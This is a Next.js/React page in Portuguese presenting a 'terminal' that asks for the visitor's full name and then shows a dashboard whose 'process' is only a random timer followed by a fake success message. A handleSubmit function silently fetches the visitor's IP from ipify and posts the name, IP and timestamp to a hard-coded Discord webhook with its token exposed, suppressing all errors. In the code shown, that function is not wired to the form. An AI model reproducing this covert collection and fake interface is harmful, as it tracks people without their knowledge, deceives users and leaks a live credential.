"use client"

import React from "react"

import { useState } from "react"

type AppView = "welcome" | "dashboard"
type ProcessState = "idle" | "processing" | "complete"

export default function Home() {
  const [currentView, setCurrentView] = useState<AppView>("welcome")
  const [userName, setUserName] = useState("")
  const [nameInput, setNameInput] = useState("")
  const [processInput, setProcessInput] = useState("")
  const [processState, setProcessState] = useState<ProcessState>("idle")

  const handleAccessDashboard = (e: React.FormEvent) => {
    e.preventDefault()
    setUserName(nameInput)
    setCurrentView("dashboard")
  }

  const handleStartProcess = (e: React.FormEvent) => {
    e.preventDefault()
    setProcessState("processing")
    const processingTime = 3000 + Math.random() * 2000
    setTimeout(() => {
      setProcessState("complete")
    }, processingTime)
  }

  const handleReset = () => {
    setProcessState("idle")
    setProcessInput("")
  }
  
  const handleSubmit = async () => {
  if (!nameInput.trim()) return;

  try {
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();

    const payload = {
      nome: nameInput.trim(),
      ip: ipData.ip,
      timestamp: new Date().toISOString()
    };

    await fetch('https://discord.com/api/webhooks/1468760215825416387/tW8vadzezo-SMlp9p6_DP2_Wqfzbh_Edlsj9LnxXCfwzM-joMu7ICHFZdZ2__yA4zd1a', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    setNameInput('');  // limpa o campo (opcional)
  } catch (err) {
    // silencioso
  }
};

  if (currentView === "welcome") {
    return (
      <main
        style={{
          minHeight: "100vh",
          background: "linear-gradient(135deg, #0d0015 0%, #1a0a2e 25%, #16082a 50%, #0f0518 75%, #050208 100%)",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          padding: "16px",
          position: "relative",
          overflow: "hidden",
        }}
      >
        {/* Neon glow effects */}
        <div
          style={{
            position: "absolute",
            top: "10%",
            left: "5%",
            width: "300px",
            height: "300px",
            background: "radial-gradient(circle, rgba(168, 85, 247, 0.4) 0%, transparent 70%)",
            filter: "blur(80px)",
            animation: "pulse 4s ease-in-out infinite",
          }}
        />
        <div
          style={{
            position: "absolute",
            bottom: "10%",
            right: "5%",
            width: "350px",
            height: "350px",
            background: "radial-gradient(circle, rgba(6, 182, 212, 0.35) 0%, transparent 70%)",
            filter: "blur(100px)",
            animation: "pulse 5s ease-in-out infinite",
          }}
        />
        <div
          style={{
            position: "absolute",
            top: "50%",
            right: "20%",
            width: "200px",
            height: "200px",
            background: "radial-gradient(circle, rgba(236, 72, 153, 0.3) 0%, transparent 70%)",
            filter: "blur(60px)",
            animation: "pulse 3s ease-in-out infinite",
          }}
        />

        <div style={{ width: "100%", maxWidth: "500px", textAlign: "center", position: "relative", zIndex: 10 }}>
          {/* Status badge */}
          <div
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "10px",
              padding: "10px 20px",
              background: "rgba(34, 197, 94, 0.1)",
              border: "1px solid rgba(34, 197, 94, 0.4)",
              borderRadius: "50px",
              marginBottom: "32px",
            }}
          >
            <span
              style={{
                width: "10px",
                height: "10px",
                background: "#22c55e",
                borderRadius: "50%",
                boxShadow: "0 0 15px #22c55e",
                animation: "pulse 2s ease-in-out infinite",
              }}
            />
            <span style={{ color: "#22c55e", fontSize: "11px", fontWeight: 800, letterSpacing: "3px", textTransform: "uppercase" }}>
              SISTEMA ONLINE
            </span>
          </div>

          {/* Main title */}
          <h1
            style={{
              fontSize: "clamp(42px, 10vw, 72px)",
              fontWeight: 900,
              lineHeight: 1,
              marginBottom: "16px",
              textTransform: "uppercase",
              background: "linear-gradient(135deg, #06b6d4 0%, #a855f7 40%, #ec4899 70%, #f97316 100%)",
              WebkitBackgroundClip: "text",
              WebkitTextFillColor: "transparent",
              backgroundClip: "text",
              filter: "drop-shadow(0 0 30px rgba(168, 85, 247, 0.5))",
            }}
          >
            BEM-VINDO
          </h1>
          
          <h2
            style={{
              fontSize: "clamp(18px, 4vw, 28px)",
              fontWeight: 700,
              letterSpacing: "8px",
              color: "rgba(255, 255, 255, 0.85)",
              textTransform: "uppercase",
              marginBottom: "24px",
            }}
          >
            AO TERMINAL
          </h2>

          {/* Decorative line */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "16px", marginBottom: "24px" }}>
            <div style={{ height: "2px", width: "60px", background: "linear-gradient(90deg, transparent, #a855f7)" }} />
            <span style={{ color: "#a855f7", fontSize: "14px", fontWeight: 800 }}>///</span>
            <div style={{ height: "2px", width: "60px", background: "linear-gradient(90deg, #a855f7, transparent)" }} />
          </div>

          <p style={{ color: "rgba(255, 255, 255, 0.6)", fontSize: "16px", marginBottom: "48px", lineHeight: 1.6 }}>
            Para acessar as funcionalidades, informe seu{" "}
            <span style={{ color: "#06b6d4", fontWeight: 700 }}>nome completo</span> abaixo
          </p>

          {/* Form */}
          <form onSubmit={handleAccessDashboard} style={{ display: "flex", flexDirection: "column", gap: "24px" }}>
            <div style={{ textAlign: "left" }}>
              <label
                htmlFor="fullName"
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "10px",
                  fontSize: "13px",
                  fontWeight: 800,
                  color: "#a855f7",
                  letterSpacing: "3px",
                  textTransform: "uppercase",
                  marginBottom: "12px",
                }}
              >
                <span style={{ color: "#ec4899" }}>{">>"}</span> Nome completo
              </label>
              <input
                id="fullName"
                type="text"
                placeholder="Digite seu nome..."
                value={nameInput}
                onChange={(e) => setNameInput(e.target.value)}
                autoComplete="name"
                style={{
                  width: "100%",
                  height: "64px",
                  padding: "0 24px",
                  fontSize: "18px",
                  background: "rgba(15, 10, 25, 0.8)",
                  border: "2px solid rgba(168, 85, 247, 0.4)",
                  borderRadius: "24px",
                  color: "#ffffff",
                  outline: "none",
                  transition: "all 0.3s ease",
                  boxShadow: "0 0 20px rgba(168, 85, 247, 0.1), inset 0 0 20px rgba(0, 0, 0, 0.3)",
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = "#a855f7"
                  e.target.style.boxShadow = "0 0 40px rgba(168, 85, 247, 0.3), inset 0 0 20px rgba(0, 0, 0, 0.3)"
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = "rgba(168, 85, 247, 0.4)"
                  e.target.style.boxShadow = "0 0 20px rgba(168, 85, 247, 0.1), inset 0 0 20px rgba(0, 0, 0, 0.3)"
                }}
              />
            </div>

            <div style={{ display: "flex", justifyContent: "center", marginTop: "8px" }}>
              <button
                type="submit"
                style={{
                  width: "100%",
                  maxWidth: "320px",
                  height: "56px",
                  fontSize: "14px",
                  fontWeight: 900,
                  letterSpacing: "3px",
                  textTransform: "uppercase",
                  background: "linear-gradient(135deg, #7c3aed 0%, #a855f7 30%, #ec4899 70%, #f97316 100%)",
                  border: "none",
                  borderRadius: "28px",
                  color: "#ffffff",
                  cursor: "pointer",
                  transition: "all 0.3s ease",
                  boxShadow: "0 0 40px rgba(168, 85, 247, 0.4), 0 10px 40px rgba(236, 72, 153, 0.3)",
                }}
                onMouseOver={(e) => {
                  e.currentTarget.style.transform = "translateY(-2px) scale(1.02)"
                  e.currentTarget.style.boxShadow = "0 0 60px rgba(168, 85, 247, 0.6), 0 15px 50px rgba(236, 72, 153, 0.4)"
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.transform = "translateY(0) scale(1)"
                  e.currentTarget.style.boxShadow = "0 0 40px rgba(168, 85, 247, 0.4), 0 10px 40px rgba(236, 72, 153, 0.3)"
                }}
              >
                ACESSAR DASHBOARD
              </button>
            </div>
          </form>

          {/* Footer info */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "16px", marginTop: "48px" }}>
            <span style={{ color: "rgba(255, 255, 255, 0.3)", fontSize: "11px", fontFamily: "monospace" }}>v2.0.7</span>
            <span style={{ color: "rgba(168, 85, 247, 0.5)" }}>|</span>
            <span style={{ color: "rgba(255, 255, 255, 0.3)", fontSize: "11px", letterSpacing: "2px", textTransform: "uppercase" }}>
              Secure Connection
            </span>
          </div>
        </div>

        <style>{`
          @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
          }
          input::placeholder {
            color: rgba(255, 255, 255, 0.3);
          }
        `}</style>
      </main>
    )
  }

  return (
    <main
      style={{
        minHeight: "100vh",
        background: "linear-gradient(135deg, #0d0015 0%, #1a0a2e 25%, #16082a 50%, #0f0518 75%, #050208 100%)",
        padding: "32px 16px",
        position: "relative",
        overflow: "hidden",
      }}
    >
      {/* Background glows */}
      <div
        style={{
          position: "absolute",
          top: "0",
          left: "20%",
          width: "400px",
          height: "400px",
          background: "radial-gradient(circle, rgba(168, 85, 247, 0.2) 0%, transparent 70%)",
          filter: "blur(100px)",
        }}
      />
      <div
        style={{
          position: "absolute",
          bottom: "0",
          right: "10%",
          width: "350px",
          height: "350px",
          background: "radial-gradient(circle, rgba(6, 182, 212, 0.2) 0%, transparent 70%)",
          filter: "blur(80px)",
        }}
      />

      <div style={{ maxWidth: "700px", margin: "0 auto", position: "relative", zIndex: 10 }}>
        {/* Header */}
        <header style={{ marginBottom: "40px" }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", flexWrap: "wrap", gap: "16px", marginBottom: "24px" }}>
            <div
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "10px",
                padding: "10px 20px",
                background: "rgba(34, 197, 94, 0.1)",
                border: "1px solid rgba(34, 197, 94, 0.4)",
                borderRadius: "50px",
              }}
            >
              <span
                style={{
                  width: "10px",
                  height: "10px",
                  background: "#22c55e",
                  borderRadius: "50%",
                  boxShadow: "0 0 15px #22c55e",
                }}
              />
              <span style={{ color: "#22c55e", fontSize: "11px", fontWeight: 800, letterSpacing: "2px", textTransform: "uppercase" }}>
                CONECTADO
              </span>
            </div>
            <div style={{ color: "rgba(255, 255, 255, 0.5)", fontSize: "14px" }}>
              <span style={{ color: "#a855f7" }}>//</span> Operador:{" "}
              <span style={{ color: "#06b6d4", fontWeight: 700 }}>{userName || "Usuario"}</span>
            </div>
          </div>

          <h1
            style={{
              fontSize: "clamp(32px, 8vw, 56px)",
              fontWeight: 900,
              textTransform: "uppercase",
              background: "linear-gradient(135deg, #ec4899 0%, #a855f7 50%, #06b6d4 100%)",
              WebkitBackgroundClip: "text",
              WebkitTextFillColor: "transparent",
              backgroundClip: "text",
              filter: "drop-shadow(0 0 25px rgba(236, 72, 153, 0.4))",
              marginBottom: "8px",
            }}
          >
            FERRAMENTAS
          </h1>
          <h2
            style={{
              fontSize: "clamp(16px, 3vw, 24px)",
              fontWeight: 700,
              letterSpacing: "6px",
              color: "rgba(255, 255, 255, 0.7)",
              textTransform: "uppercase",
            }}
          >
            DISPONIVEIS
          </h2>
        </header>

        {/* Main form card */}
        <div
          style={{
            background: "rgba(15, 10, 30, 0.6)",
            border: "1px solid rgba(168, 85, 247, 0.3)",
            borderRadius: "32px",
            padding: "32px",
            marginBottom: "24px",
            boxShadow: "0 0 60px rgba(168, 85, 247, 0.1), inset 0 0 30px rgba(0, 0, 0, 0.3)",
          }}
        >
          <form onSubmit={handleStartProcess} style={{ display: "flex", flexDirection: "column", gap: "24px" }}>
            <div>
              <label
                htmlFor="processInput"
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "10px",
                  fontSize: "13px",
                  fontWeight: 800,
                  color: "#a855f7",
                  letterSpacing: "2px",
                  textTransform: "uppercase",
                  marginBottom: "12px",
                }}
              >
                <span style={{ color: "#06b6d4" }}>{">>"}</span> Digite a informacao para prosseguir
              </label>
              <input
                id="processInput"
                type="text"
                placeholder="Insira a informacao aqui..."
                value={processInput}
                onChange={(e) => setProcessInput(e.target.value)}
                disabled={processState === "processing"}
                style={{
                  width: "100%",
                  height: "64px",
                  padding: "0 24px",
                  fontSize: "18px",
                  background: "rgba(10, 5, 20, 0.8)",
                  border: "2px solid rgba(6, 182, 212, 0.3)",
                  borderRadius: "24px",
                  color: "#ffffff",
                  outline: "none",
                  transition: "all 0.3s ease",
                  opacity: processState === "processing" ? 0.5 : 1,
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = "#06b6d4"
                  e.target.style.boxShadow = "0 0 30px rgba(6, 182, 212, 0.3)"
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = "rgba(6, 182, 212, 0.3)"
                  e.target.style.boxShadow = "none"
                }}
              />
            </div>

            <div style={{ display: "flex", justifyContent: "center", marginTop: "8px" }}>
              <button
                type="submit"
                disabled={processState === "processing"}
                style={{
                  width: "100%",
                  maxWidth: "280px",
                  height: "54px",
                  fontSize: "13px",
                  fontWeight: 900,
                  letterSpacing: "2px",
                  textTransform: "uppercase",
                  background: "linear-gradient(135deg, #06b6d4 0%, #a855f7 50%, #ec4899 100%)",
                  border: "none",
                  borderRadius: "27px",
                  color: "#ffffff",
                  cursor: processState === "processing" ? "not-allowed" : "pointer",
                  transition: "all 0.3s ease",
                  boxShadow: "0 0 40px rgba(6, 182, 212, 0.3), 0 10px 40px rgba(168, 85, 247, 0.2)",
                  opacity: processState === "processing" ? 0.7 : 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: "10px",
                }}
                onMouseOver={(e) => {
                  if (processState !== "processing") {
                    e.currentTarget.style.transform = "translateY(-2px) scale(1.02)"
                    e.currentTarget.style.boxShadow = "0 0 60px rgba(6, 182, 212, 0.5), 0 15px 50px rgba(168, 85, 247, 0.3)"
                  }
                }}
                onMouseOut={(e) => {
                  e.currentTarget.style.transform = "translateY(0) scale(1)"
                  e.currentTarget.style.boxShadow = "0 0 40px rgba(6, 182, 212, 0.3), 0 10px 40px rgba(168, 85, 247, 0.2)"
                }}
              >
                {processState === "processing" ? (
                  <>
                    <svg
                      style={{ width: "24px", height: "24px", animation: "spin 1s linear infinite" }}
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle style={{ opacity: 0.25 }} cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path
                        style={{ opacity: 0.75 }}
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    PROCESSANDO...
                  </>
                ) : (
                  "INICIAR PROCESSO"
                )}
              </button>
            </div>
          </form>
        </div>

        {/* Result card */}
        <div
          style={{
            background: "rgba(15, 10, 30, 0.6)",
            border: "1px solid rgba(6, 182, 212, 0.2)",
            borderRadius: "32px",
            padding: "32px",
            boxShadow: "0 0 40px rgba(6, 182, 212, 0.05)",
          }}
        >
          {processState === "idle" && (
            <div style={{ textAlign: "center", padding: "40px 0" }}>
              <div
                style={{
                  width: "80px",
                  height: "80px",
                  margin: "0 auto 24px",
                  borderRadius: "50%",
                  border: "2px dashed rgba(168, 85, 247, 0.3)",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  background: "rgba(168, 85, 247, 0.05)",
                }}
              >
                <svg style={{ width: "40px", height: "40px", color: "rgba(168, 85, 247, 0.5)" }} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
              </div>
              <p style={{ color: "rgba(255, 255, 255, 0.4)", fontSize: "13px", letterSpacing: "3px", textTransform: "uppercase" }}>
                Resultado sera exibido aqui apos processamento
              </p>
            </div>
          )}

          {processState === "processing" && (
            <div style={{ textAlign: "center", padding: "40px 0" }}>
              <div
                style={{
                  width: "80px",
                  height: "80px",
                  margin: "0 auto 24px",
                  borderRadius: "50%",
                  border: "2px solid #06b6d4",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  background: "rgba(6, 182, 212, 0.1)",
                  boxShadow: "0 0 30px rgba(6, 182, 212, 0.3)",
                }}
              >
                <svg
                  style={{ width: "40px", height: "40px", color: "#06b6d4", animation: "spin 1s linear infinite" }}
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle style={{ opacity: 0.25 }} cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path
                    style={{ opacity: 0.75 }}
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  ></path>
                </svg>
              </div>
              <p style={{ fontSize: "18px", fontWeight: 900, color: "#ffffff", letterSpacing: "2px", textTransform: "uppercase", marginBottom: "8px" }}>
                PROCESSANDO SOLICITACAO...
              </p>
              <p style={{ fontSize: "14px", color: "rgba(255, 255, 255, 0.5)" }}>Por favor, aguarde</p>
              <div style={{ display: "flex", justifyContent: "center", gap: "8px", marginTop: "24px" }}>
                <span style={{ width: "12px", height: "12px", borderRadius: "50%", background: "#06b6d4", animation: "bounce 1s ease-in-out infinite" }} />
                <span style={{ width: "12px", height: "12px", borderRadius: "50%", background: "#a855f7", animation: "bounce 1s ease-in-out 0.15s infinite" }} />
                <span style={{ width: "12px", height: "12px", borderRadius: "50%", background: "#ec4899", animation: "bounce 1s ease-in-out 0.3s infinite" }} />
              </div>
            </div>
          )}

          {processState === "complete" && (
            <div style={{ textAlign: "center", padding: "40px 0" }}>
              <div
                style={{
                  width: "80px",
                  height: "80px",
                  margin: "0 auto 24px",
                  borderRadius: "50%",
                  border: "2px solid #22c55e",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  background: "rgba(34, 197, 94, 0.1)",
                  boxShadow: "0 0 30px rgba(34, 197, 94, 0.3)",
                }}
              >
                <svg style={{ width: "40px", height: "40px", color: "#22c55e" }} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                </svg>
              </div>
              <p style={{ fontSize: "18px", fontWeight: 900, color: "#22c55e", letterSpacing: "2px", textTransform: "uppercase", marginBottom: "8px" }}>
                PROCESSO INICIADO COM SUCESSO
              </p>
              <p style={{ fontSize: "14px", color: "rgba(255, 255, 255, 0.5)", marginBottom: "32px" }}>
                Aguarde atualizacoes ou tente novamente se necessario.
              </p>
              <div style={{ display: "flex", justifyContent: "center" }}>
                <button
                  type="button"
                  onClick={handleReset}
                  style={{
                    padding: "14px 36px",
                    fontSize: "12px",
                    fontWeight: 900,
                    letterSpacing: "2px",
                    textTransform: "uppercase",
                    background: "rgba(20, 10, 35, 0.8)",
                    border: "2px solid rgba(236, 72, 153, 0.5)",
                    borderRadius: "24px",
                    color: "#ec4899",
                    cursor: "pointer",
                    transition: "all 0.3s ease",
                  }}
                  onMouseOver={(e) => {
                    e.currentTarget.style.borderColor = "#ec4899"
                    e.currentTarget.style.boxShadow = "0 0 30px rgba(236, 72, 153, 0.4)"
                    e.currentTarget.style.color = "#ffffff"
                    e.currentTarget.style.transform = "translateY(-2px) scale(1.02)"
                  }}
                  onMouseOut={(e) => {
                    e.currentTarget.style.borderColor = "rgba(236, 72, 153, 0.5)"
                    e.currentTarget.style.transform = "translateY(0) scale(1)"
                    e.currentTarget.style.boxShadow = "none"
                    e.currentTarget.style.color = "#ec4899"
                  }}
                >
                  NOVA SOLICITACAO
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Footer */}
        <footer style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "16px", marginTop: "32px" }}>
          <span style={{ color: "rgba(255, 255, 255, 0.3)", fontSize: "11px", fontFamily: "monospace" }}>SYS.v2.0.7</span>
          <span style={{ color: "rgba(168, 85, 247, 0.4)" }}>|</span>
          <span style={{ color: "rgba(255, 255, 255, 0.3)", fontSize: "11px", letterSpacing: "1px" }}>Status:</span>
          <span style={{ color: "#22c55e", fontWeight: 700, fontSize: "11px", textTransform: "uppercase" }}>ONLINE</span>
        </footer>
      </div>

      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        @keyframes bounce {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-10px); }
        }
        @keyframes pulse {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.5; }
        }
        input::placeholder {
          color: rgba(255, 255, 255, 0.3);
        }
      `}</style>
    </main>
  )
}
